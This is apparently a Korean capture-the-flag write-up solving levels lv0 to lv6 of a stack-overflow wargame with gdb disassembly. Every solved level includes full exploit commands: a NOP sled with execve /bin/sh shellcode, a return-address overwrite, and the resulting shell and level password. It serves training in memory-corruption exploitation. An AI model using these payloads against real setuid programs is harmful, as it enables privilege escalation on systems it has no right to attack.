Wargame
=======
## 들어가기전에
lv0 비밀번호 : lv0   

## lv 0
gdb로 lv1이 무슨 프로그램인지 확인해보자.   
```pwndbg> disass main   
Dump of assembler code for function main:   
   0x08048430 <+0>:	push   ebp   
   0x08048431 <+1>:	mov    ebp,esp   
   0x08048433 <+3>:	sub    esp,0x100   
   0x08048439 <+9>:	cmp    DWORD PTR [ebp+0x8],0x1    
   0x0804843d <+13>:	jg     0x8048456 <main+38>   
   0x0804843f <+15>:	push   0x80484e0   
   0x08048444 <+20>:	call   0x8048350 <printf@plt>   
   0x08048449 <+25>:	add    esp,0x4   
   0x0804844c <+28>:	push   0x0   
   0x0804844e <+30>:	call   0x8048360 <exit@plt>   
   0x08048453 <+35>:	add    esp,0x4   
   0x08048456 <+38>:	mov    eax,DWORD PTR [ebp+0xc]   
   0x08048459 <+41>:	add    eax,0x4   
   0x0804845c <+44>:	mov    edx,DWORD PTR [eax]   
   0x0804845e <+46>:	push   edx   
   0x0804845f <+47>:	lea    eax,[ebp-0x100]   
   0x08048465 <+53>:	push   eax   
   0x08048466 <+54>:	call   0x8048370 <strcpy@plt>   
   0x0804846b <+59>:	add    esp,0x8   
   0x0804846e <+62>:	lea    eax,[ebp-0x100]    
   0x08048474 <+68>:	push   eax   
   0x08048475 <+69>:	push   0x80484ec   
   0x0804847a <+74>:	call   0x8048350 <printf@plt>   
   0x0804847f <+79>:	add    esp,0x8   
   0x08048482 <+82>:	leave   
   0x08048483 <+83>:	ret   
```   
0x0804845f <+47>:	lea    eax,[ebp-0x100]   
이 부분을 보면 strcpy로 256바이트만큼의 문자열을 담을 수 있다.  

즉 ret부분까지 덮기위해서는 8바이트가 더 필요하다.  
따라서 260바이트 만큼 쓰레기 값을 담아주고 나머지 4바이트에 원하는 주소값을 넣어준다.   

```
`export SHELLCODE=`perl -e 'print "\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
```   
또한 공격을 위한 쉘코드는 위처럼 export로 환경변수를 만들고 그 안에다가 nop값과 함께 넣어준다.   
그리고 gdb에서 ```x/2000x $esp```를 통해 알아낸 nop부분의 적당한 주소값을 ret에 넣어준다.   
이렇게 해주면 main이 끝나고 ret을 통해 nop주소로 이동을하며 쉘코드를 실행시키게 된다.

필자가 ret에 넣어줄 주소값은 ```0xffffda7c```이다.

실행결과   
```
./lv1 `perl -e 'print "a"x260, "\x7c\xda\xff\xff"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|���
$ whoami
lv1
$ id
uid=1001(lv1) gid=1000(lv0) groups=1000(lv0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

성공적으로 권한을 얻은것을 확인할 수 있다.

알아낸 lv1 비번 : hello newbie!

## lv 1
gbd로 lv2가 무엇을 하는 프로그램인지 확인해보자. 
```
pwndbg> disass main   
Dump of assembler code for function main:   
   0x08048430 <+0>:	push   ebp   
   0x08048431 <+1>:	mov    ebp,esp   
   0x08048433 <+3>:	sub    esp,0x10   
   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1   
   0x0804843a <+10>:	jg     0x8048453 <main+35>   
   0x0804843c <+12>:	push   0x80484d0   
   0x08048441 <+17>:	call   0x8048350 <printf@plt>    
   0x08048446 <+22>:	add    esp,0x4   
   0x08048449 <+25>:	push   0x0   
   0x0804844b <+27>:	call   0x8048360 <exit@plt>   
   0x08048450 <+32>:	add    esp,0x4   
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]   
   0x08048456 <+38>:	add    eax,0x4   
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]   
   0x0804845b <+43>:	push   edx   
   0x0804845c <+44>:	lea    eax,[ebp-0x10]   
   0x0804845f <+47>:	push   eax   
   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>   
   0x08048465 <+53>:	add    esp,0x8   
   0x08048468 <+56>:	lea    eax,[ebp-0x10]   
   0x0804846b <+59>:	push   eax   
   0x0804846c <+60>:	push   0x80484dc   
   0x08048471 <+65>:	call   0x8048350 <printf@plt>   
   0x08048476 <+70>:	add    esp,0x8   
   0x08048479 <+73>:	leave   
   0x0804847a <+74>:	ret  
   ```
lv1 프로그램과 크게 다른점은 없다.   

0x08048468 <+56>:	lea    eax,[ebp-0x10]   
다른점이라고하면 strcpy에 16바이트밖에 못 담는다는 것이고  
24바이트만에 ret까지 채워넣을 수 있게된다.

따라서 lv1과 같은 방법으로 문제를 풀어주면 된다.

실행결과
```
lv1@ubuntu:~$ ./lv2 `perl -e 'print "a"x20, "\xac\xda\xff\xff"'`
aaaaaaaaaaaaaaaaaaaa����
$ whoami
lv2
$ id
uid=1002(lv2) gid=1001(lv1) groups=1001(lv1)
```

알아낸 lv2 비번 : tooo easy
## lv 2
gdb로 lv3가 무슨 프로그램인지 확인해보자.
```
   0x080483f8 <+0>:	push   ebp
   0x080483f9 <+1>:	mov    ebp,esp
   0x080483fb <+3>:	sub    esp,0x10
   0x080483fe <+6>:	lea    eax,[ebp-0x10]
   0x08048401 <+9>:	push   eax
   0x08048402 <+10>:	call   0x804830c <gets@plt>
   0x08048407 <+15>:	add    esp,0x4
   0x0804840a <+18>:	lea    eax,[ebp-0x10]
   0x0804840d <+21>:	push   eax
   0x0804840e <+22>:	push   0x8048470
   0x08048413 <+27>:	call   0x804833c <printf@plt>
   0x08048418 <+32>:	add    esp,0x8
   0x0804841b <+35>:	leave  
   0x0804841c <+36>:	ret
   ```
lv3는 그 전과는 다르게 strcpy가 아닌 gets함수로 문자를 입력받게된다.   
마찬가지로 16바이트만큼 담을 수 있으며 초과부분은 ebp를 지나 ret까지 침범하게된다.  

그 전 문제들과는 같게 풀어주되 이번에는 ./lv3를 실행시킬때 파이프라인을 이용하자.  
```
lv2@ubuntu:~$ (perl -e 'print "a"x20, "\x8c\xda\xff\xff"';cat) | ./lv3
id
aaaaaaaaaaaaaaaaaaaa����id
id
uid=1003(lv3) gid=1002(lv2) groups=1002(lv2)
```

알아낸 lv3 비번 : i dont like stdin

## lv 3
gdb로 lv4가 무슨 프로그램인지 확인해보자.
```
   0x08048500 <+0>:	push   ebp
   0x08048501 <+1>:	mov    ebp,esp
   0x08048503 <+3>:	sub    esp,0x2c
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804850a <+10>:	jg     0x8048523 <main+35>
   0x0804850c <+12>:	push   0x8048630
   0x08048511 <+17>:	call   0x8048410 <printf@plt>
   0x08048516 <+22>:	add    esp,0x4
   0x08048519 <+25>:	push   0x0
   0x0804851b <+27>:	call   0x8048420 <exit@plt>
   0x08048520 <+32>:	add    esp,0x4
   0x08048523 <+35>:	nop
   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804852b <+43>:	nop
   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
   0x0804853a <+58>:	mov    eax,ds:0x8049750
   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
   0x08048543 <+67>:	jne    0x8048547 <main+71>
   0x08048545 <+69>:	jmp    0x8048587 <main+135>
   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
   0x08048551 <+81>:	mov    eax,ds:0x8049750
   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048559 <+89>:	push   edx
   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
   0x0804855f <+95>:	add    esp,0x4
   0x08048562 <+98>:	mov    eax,eax
   0x08048564 <+100>:	push   eax
   0x08048565 <+101>:	push   0x0
   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
   0x08048571 <+113>:	mov    eax,ds:0x8049750
   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048579 <+121>:	push   edx
   0x0804857a <+122>:	call   0x8048430 <memset@plt>
   0x0804857f <+127>:	add    esp,0xc
   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
   0x08048585 <+133>:	jmp    0x8048530 <main+48>
   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858a <+138>:	add    eax,0x4
   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
   0x0804858f <+143>:	add    edx,0x2f
   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
   0x08048595 <+149>:	je     0x80485b0 <main+176>
   0x08048597 <+151>:	push   0x804863c
   0x0804859c <+156>:	call   0x8048410 <printf@plt>
   0x080485a1 <+161>:	add    esp,0x4
   0x080485a4 <+164>:	push   0x0
   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
   0x080485ab <+171>:	add    esp,0x4
   0x080485ae <+174>:	mov    esi,esi
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	lea    eax,[ebp-0x28]
   0x080485bc <+188>:	push   eax
   0x080485bd <+189>:	call   0x8048440 <strcpy@plt>
   0x080485c2 <+194>:	add    esp,0x8
   0x080485c5 <+197>:	lea    eax,[ebp-0x28]
   0x080485c8 <+200>:	push   eax
   0x080485c9 <+201>:	push   0x8048659
   0x080485ce <+206>:	call   0x8048410 <printf@plt>
   0x080485d3 <+211>:	add    esp,0x8
   0x080485d6 <+214>:	leave  
   0x080485d7 <+215>:	ret 
```
이번에는 환경변수를 초기화시켜 버린다.  
그리고 버퍼에 담을 수 있는 공간은 0x28바이트뿐

거기다가  
```0x8048592 <main+146>    cmp    byte ptr [edx], 0xff```  
입력된 값의 48번째 자리가 \xff인지 확인하는 코드까지 있다.

그러나 함수의 인자부분은 지우지 않는 것을 확인할 수 있으므로  
44바이트의 쓰레기값과 4바이트의 주소값을 넣어 준 후 뒤에 nop와 쉘코드를 넣어준다.

```
lv3@ubuntu:~$ ./lv4 `perl -e 'print "a"x44,"\xac\xd3\xff\xff","\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1��1̀�É�1��F̀1�Ph//shh/bin��PS���°
                                           1��̀
$ whoami
lv4
$ id
uid=1004(lv4) gid=1003(lv3) groups=1003(lv3)
$ my-pass
broken egg
$ 
```
알아낸 lv4 비번 : broken egg

## lv 4
gdb로 lv5가 무슨 프로그램인지 확인해보자.
```
   0x08048500 <+0>:	push   ebp
   0x08048501 <+1>:	mov    ebp,esp
   0x08048503 <+3>:	sub    esp,0x2c
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804850a <+10>:	jg     0x8048523 <main+35>
   0x0804850c <+12>:	push   0x8048640
   0x08048511 <+17>:	call   0x8048410 <printf@plt>
   0x08048516 <+22>:	add    esp,0x4
   0x08048519 <+25>:	push   0x0
   0x0804851b <+27>:	call   0x8048420 <exit@plt>
   0x08048520 <+32>:	add    esp,0x4
   0x08048523 <+35>:	nop
   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804852b <+43>:	nop
   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
   0x0804853a <+58>:	mov    eax,ds:0x8049760
   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
   0x08048543 <+67>:	jne    0x8048547 <main+71>
   0x08048545 <+69>:	jmp    0x8048587 <main+135>
   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
   0x08048551 <+81>:	mov    eax,ds:0x8049760
   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048559 <+89>:	push   edx
   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
   0x0804855f <+95>:	add    esp,0x4
   0x08048562 <+98>:	mov    eax,eax
   0x08048564 <+100>:	push   eax
   0x08048565 <+101>:	push   0x0
   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
   0x08048571 <+113>:	mov    eax,ds:0x8049760
   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048579 <+121>:	push   edx
   0x0804857a <+122>:	call   0x8048430 <memset@plt>
   0x0804857f <+127>:	add    esp,0xc
   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
   0x08048585 <+133>:	jmp    0x8048530 <main+48>
   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858a <+138>:	add    eax,0x4
   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
   0x0804858f <+143>:	add    edx,0x2f
   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
   0x08048595 <+149>:	je     0x80485b0 <main+176>
   0x08048597 <+151>:	push   0x804864c
   0x0804859c <+156>:	call   0x8048410 <printf@plt>
   0x080485a1 <+161>:	add    esp,0x4
   0x080485a4 <+164>:	push   0x0
   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
   0x080485ab <+171>:	add    esp,0x4
   0x080485ae <+174>:	mov    esi,esi
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	lea    eax,[ebp-0x28]
   0x080485bc <+188>:	push   eax
   0x080485bd <+189>:	call   0x8048440 <strcpy@plt>
   0x080485c2 <+194>:	add    esp,0x8
   0x080485c5 <+197>:	lea    eax,[ebp-0x28]
   0x080485c8 <+200>:	push   eax
   0x080485c9 <+201>:	push   0x8048669
   0x080485ce <+206>:	call   0x8048410 <printf@plt>
   0x080485d3 <+211>:	add    esp,0x8
   0x080485d6 <+214>:	push   0x28
   0x080485d8 <+216>:	push   0x0
   0x080485da <+218>:	lea    eax,[ebp-0x28]
   0x080485dd <+221>:	push   eax
   0x080485de <+222>:	call   0x8048430 <memset@plt>
   0x080485e3 <+227>:	add    esp,0xc
   0x080485e6 <+230>:	leave  
   0x080485e7 <+231>:	ret    
   ```
lv3문제와 큰 차이가 없다.  
마지막에 버퍼를 초기화하는 memset이 추가되었을 뿐이다.  
그러나 sfp와 ret부분은 살아있다.

함수 인자부부은 여전히 살아있는 것을 알 수 있으므로  
lv3와 같은 방법으로 문제를 풀어주면 될것이다.
```
lv4@ubuntu:~$ ./lv5 `perl -e 'print "a"x44,"\xb0\xd3\xff\xff","\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1��1̀�É�1��F̀1�Ph//shh/bin��PS���°
                                           1��̀
$ whoami
lv5
$ id
uid=1005(lv5) gid=1004(lv4) groups=1004(lv4)
$ my-pass
cheese toast
$ 
```
알아낸 lv5 비번 : cheese toast
## lv 5
gdb로 lv6가 무슨 프로그램인지 확인해보자.
```
   0x08048500 <+0>:	push   ebp
   0x08048501 <+1>:	mov    ebp,esp
   0x08048503 <+3>:	sub    esp,0x2c
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804850a <+10>:	jg     0x8048523 <main+35>
   0x0804850c <+12>:	push   0x8048670
   0x08048511 <+17>:	call   0x8048410 <printf@plt>
   0x08048516 <+22>:	add    esp,0x4
   0x08048519 <+25>:	push   0x0
   0x0804851b <+27>:	call   0x8048420 <exit@plt>
   0x08048520 <+32>:	add    esp,0x4
   0x08048523 <+35>:	nop
   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804852b <+43>:	nop
   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
   0x0804853a <+58>:	mov    eax,ds:0x80497a4
   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
   0x08048543 <+67>:	jne    0x8048547 <main+71>
   0x08048545 <+69>:	jmp    0x8048587 <main+135>
   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
   0x08048551 <+81>:	mov    eax,ds:0x80497a4
   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048559 <+89>:	push   edx
   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
   0x0804855f <+95>:	add    esp,0x4
   0x08048562 <+98>:	mov    eax,eax
   0x08048564 <+100>:	push   eax
   0x08048565 <+101>:	push   0x0
   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
   0x08048571 <+113>:	mov    eax,ds:0x80497a4
   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048579 <+121>:	push   edx
   0x0804857a <+122>:	call   0x8048430 <memset@plt>
   0x0804857f <+127>:	add    esp,0xc
   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
   0x08048585 <+133>:	jmp    0x8048530 <main+48>
   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858a <+138>:	add    eax,0x4
   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
   0x0804858f <+143>:	add    edx,0x2f
   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
   0x08048595 <+149>:	je     0x80485b0 <main+176>
   0x08048597 <+151>:	push   0x804867c
   0x0804859c <+156>:	call   0x8048410 <printf@plt>
   0x080485a1 <+161>:	add    esp,0x4
   0x080485a4 <+164>:	push   0x0
   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
   0x080485ab <+171>:	add    esp,0x4
   0x080485ae <+174>:	mov    esi,esi
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	call   0x80483f0 <strlen@plt>
   0x080485be <+190>:	add    esp,0x4
   0x080485c1 <+193>:	mov    eax,eax
   0x080485c3 <+195>:	cmp    eax,0x30
   0x080485c6 <+198>:	jbe    0x80485e0 <main+224>
   0x080485c8 <+200>:	push   0x8048699
   0x080485cd <+205>:	call   0x8048410 <printf@plt>
   0x080485d2 <+210>:	add    esp,0x4
   0x080485d5 <+213>:	push   0x0
   0x080485d7 <+215>:	call   0x8048420 <exit@plt>
   0x080485dc <+220>:	add    esp,0x4
   0x080485df <+223>:	nop
   0x080485e0 <+224>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485e3 <+227>:	add    eax,0x4
   0x080485e6 <+230>:	mov    edx,DWORD PTR [eax]
   0x080485e8 <+232>:	push   edx
   0x080485e9 <+233>:	lea    eax,[ebp-0x28]
   0x080485ec <+236>:	push   eax
   0x080485ed <+237>:	call   0x8048440 <strcpy@plt>
   0x080485f2 <+242>:	add    esp,0x8
   0x080485f5 <+245>:	lea    eax,[ebp-0x28]
   0x080485f8 <+248>:	push   eax
   0x080485f9 <+249>:	push   0x80486b0
   0x080485fe <+254>:	call   0x8048410 <printf@plt>
   0x08048603 <+259>:	add    esp,0x8
   0x08048606 <+262>:	push   0x28
   0x08048608 <+264>:	push   0x0
   0x0804860a <+266>:	lea    eax,[ebp-0x28]
   0x0804860d <+269>:	push   eax
   0x0804860e <+270>:	call   0x8048430 <memset@plt>
   0x08048613 <+275>:	add    esp,0xc
   0x08048616 <+278>:	leave  
   0x08048617 <+279>:	ret  
```
점점 더 길어지고있다.  
무엇이 추가 되었나 확인해봤더니  
```
  0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	call   0x80483f0 <strlen@plt>
   0x080485be <+190>:	add    esp,0x4
   0x080485c1 <+193>:	mov    eax,eax
   0x080485c3 <+195>:	cmp    eax,0x30
   0x080485c6 <+198>:	jbe    0x80485e0 <main+224>
```
argv[1]의 길이를 확인하는 명령어가 추가되었다.

정확히 ret을 덮을 만큼의 길이만 허용하고있다.  
그래서 이를 해결하기 위해 strlen은 문자열의 끝을 알려주는 공백문자는 길이에 포함시키지 않는 것을 이용한다.

즉, 그동안 인자를 1개만 주었던것과는 달리 이번에는 2개를 주는 방법으로 해결하였다.  
인자를 구분하기 위해 공백이 생기며 strlen은 첫번째 인자의 개수만 세고있을것이다.
```
lv5@ubuntu:~$ ./lv6 `perl -e 'print "a"x44, "\xd0\xd3\xff\xff"'` `perl -e 'print "\x90"x200, "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
$ whoami
lv6
$ id
uid=1006(lv6) gid=1005(lv5) groups=1005(lv5)
$ my-pass
still easy
$ 
```
알아낸 lv6 비번 : still easy
## lv 6
gdb로 lv7가 무슨 프로그램인지 확인해보자.
```
   0x08048500 <+0>:	push   ebp
   0x08048501 <+1>:	mov    ebp,esp
   0x08048503 <+3>:	sub    esp,0x2c
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804850a <+10>:	jg     0x8048523 <main+35>
   0x0804850c <+12>:	push   0x8048690
   0x08048511 <+17>:	call   0x8048410 <printf@plt>
   0x08048516 <+22>:	add    esp,0x4
   0x08048519 <+25>:	push   0x0
   0x0804851b <+27>:	call   0x8048420 <exit@plt>
   0x08048520 <+32>:	add    esp,0x4
   0x08048523 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048526 <+38>:	mov    edx,DWORD PTR [eax]
   0x08048528 <+40>:	push   edx
   0x08048529 <+41>:	call   0x80483f0 <strlen@plt>
   0x0804852e <+46>:	add    esp,0x4
   0x08048531 <+49>:	mov    eax,eax
   0x08048533 <+51>:	cmp    eax,0x4d
   0x08048536 <+54>:	je     0x8048550 <main+80>
   0x08048538 <+56>:	push   0x804869c
   0x0804853d <+61>:	call   0x8048410 <printf@plt>
   0x08048542 <+66>:	add    esp,0x4
   0x08048545 <+69>:	push   0x0
   0x08048547 <+71>:	call   0x8048420 <exit@plt>
   0x0804854c <+76>:	add    esp,0x4
   0x0804854f <+79>:	nop
   0x08048550 <+80>:	nop
   0x08048551 <+81>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x08048558 <+88>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804855b <+91>:	lea    edx,[eax*4+0x0]
   0x08048562 <+98>:	mov    eax,ds:0x80497d4
   0x08048567 <+103>:	cmp    DWORD PTR [eax+edx*1],0x0
   0x0804856b <+107>:	jne    0x8048570 <main+112>
   0x0804856d <+109>:	jmp    0x80485b0 <main+176>
   0x0804856f <+111>:	nop
   0x08048570 <+112>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048573 <+115>:	lea    edx,[eax*4+0x0]
   0x0804857a <+122>:	mov    eax,ds:0x80497d4
   0x0804857f <+127>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048582 <+130>:	push   edx
   0x08048583 <+131>:	call   0x80483f0 <strlen@plt>
   0x08048588 <+136>:	add    esp,0x4
   0x0804858b <+139>:	mov    eax,eax
   0x0804858d <+141>:	push   eax
   0x0804858e <+142>:	push   0x0
   0x08048590 <+144>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048593 <+147>:	lea    edx,[eax*4+0x0]
   0x0804859a <+154>:	mov    eax,ds:0x80497d4
   0x0804859f <+159>:	mov    edx,DWORD PTR [eax+edx*1]
   0x080485a2 <+162>:	push   edx
   0x080485a3 <+163>:	call   0x8048430 <memset@plt>
   0x080485a8 <+168>:	add    esp,0xc
   0x080485ab <+171>:	inc    DWORD PTR [ebp-0x2c]
   0x080485ae <+174>:	jmp    0x8048558 <main+88>
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	add    edx,0x2f
   0x080485bb <+187>:	cmp    BYTE PTR [edx],0xff
   0x080485be <+190>:	je     0x80485d7 <main+215>
   0x080485c0 <+192>:	push   0x80486ab
   0x080485c5 <+197>:	call   0x8048410 <printf@plt>
   0x080485ca <+202>:	add    esp,0x4
   0x080485cd <+205>:	push   0x0
   0x080485cf <+207>:	call   0x8048420 <exit@plt>
   0x080485d4 <+212>:	add    esp,0x4
   0x080485d7 <+215>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485da <+218>:	add    eax,0x4
   0x080485dd <+221>:	mov    edx,DWORD PTR [eax]
   0x080485df <+223>:	push   edx
   0x080485e0 <+224>:	call   0x80483f0 <strlen@plt>
   0x080485e5 <+229>:	add    esp,0x4
   0x080485e8 <+232>:	mov    eax,eax
   0x080485ea <+234>:	cmp    eax,0x30
   0x080485ed <+237>:	jbe    0x8048606 <main+262>
   0x080485ef <+239>:	push   0x80486c8
   0x080485f4 <+244>:	call   0x8048410 <printf@plt>
   0x080485f9 <+249>:	add    esp,0x4
   0x080485fc <+252>:	push   0x0
   0x080485fe <+254>:	call   0x8048420 <exit@plt>
   0x08048603 <+259>:	add    esp,0x4
   0x08048606 <+262>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048609 <+265>:	add    eax,0x4
   0x0804860c <+268>:	mov    edx,DWORD PTR [eax]
   0x0804860e <+270>:	push   edx
   0x0804860f <+271>:	lea    eax,[ebp-0x28]
   0x08048612 <+274>:	push   eax
   0x08048613 <+275>:	call   0x8048440 <strcpy@plt>
   0x08048618 <+280>:	add    esp,0x8
   0x0804861b <+283>:	lea    eax,[ebp-0x28]
   0x0804861e <+286>:	push   eax
   0x0804861f <+287>:	push   0x80486df
   0x08048624 <+292>:	call   0x8048410 <printf@plt>
   0x08048629 <+297>:	add    esp,0x8
   0x0804862c <+300>:	push   0x28
   0x0804862e <+302>:	push   0x0
   0x08048630 <+304>:	lea    eax,[ebp-0x28]
   0x08048633 <+307>:	push   eax
   0x08048634 <+308>:	call   0x8048430 <memset@plt>
   0x08048639 <+313>:	add    esp,0xc
   0x0804863c <+316>:	leave  
   0x0804863d <+317>:	ret  
```
이번에는 초반에 ```argv[0]```길이를 검사한다.  
만약 ```./lv7 aaa```를 입력하여 lv7을 실행했다고 가정해보자.   
이때 ``argv[0]`` 은 `./lv7`이되며 `argv[1]`은 `aaa`가 된다.

즉, `argv[0]`길이를 검사한다는 것은 실행파일 이름 길이를 검사한다는 뜻이다.  
실행파일 이름이 77바이트 이상이어야 정상 작동하므로 심볼릭 링크를 이용하여 해결하자.

```ln -s [원본 파일 또는 디렉토리] [심볼릭 링크 이름]```

심볼릭 링크 이름으로 ./a(75개)를 생성해주고 lv7대신 ./a(75개)를 실행시켜 문제를 해결해준다.   
```
lv6@ubuntu:~$ ./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa `perl -e 'print "a"x44, "\x8c\xd3\xff\xff"'` `perl -e 'print "\x90"x500, "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
